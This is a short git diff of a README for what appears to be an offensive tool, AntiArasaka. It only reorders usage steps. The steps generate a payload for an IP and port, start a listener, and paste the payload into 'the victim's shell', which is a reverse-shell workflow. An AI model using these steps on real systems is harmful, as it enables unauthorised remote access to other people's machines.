@@ -84,8 +84,8 @@ AntiArasaka-Binarie -Name winrm.vbs
 ![image](https://github.com/h0ru/antiarasaka/assets/117091833/75af46c3-5875-4986-8a73-32b1e849fc49)
 ```
 1. aap -i 192.168.1.1 -p 443 #Payload
-2. [+] Payload copied to clipboard! Use Ctrl+V to paste and execute.
-3. aal -i 192.168.1.3 -p 443 #Listener
+2. aal -i 192.168.1.3 -p 443 #Listener
+3. [+] Payload copied to clipboard! Use Ctrl+V to paste and execute.
 4. Paste your payload into the victim's shell (Consider hosting the shell on a file and requesting it remotely)
 ```
 
